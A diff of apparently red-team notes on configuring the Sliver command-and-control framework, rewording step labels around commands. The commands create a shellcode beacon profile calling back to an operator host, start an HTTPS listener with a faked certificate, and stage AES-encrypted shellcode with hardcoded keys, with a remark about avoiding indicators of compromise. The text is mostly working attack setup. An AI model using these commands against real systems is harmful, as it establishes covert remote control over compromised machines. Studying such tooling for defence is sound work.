@@ -7,15 +7,15 @@ Compression is a huge IOC so I may change this to remove
 
 ## In Sliver
 
-Create new profile
+Create new beacon profile
 
 `profiles new -b  https://192.168.1.11:443 --skip-symbols --format shellcode --arch amd64 my_profile`
 
-Host SSL cert (you can fake with msf impersonate_ssl)
+Start listener and add SSL cert (you can fake with msf impersonate_ssl)
 
 `https -L 192.168.1.11 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key`
 
-Stage profile shellcode
+Stage beacon payload and create AES keys
 
 `stage-listener --url https://192.168.1.11:8080 --profile my_profile -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`
 
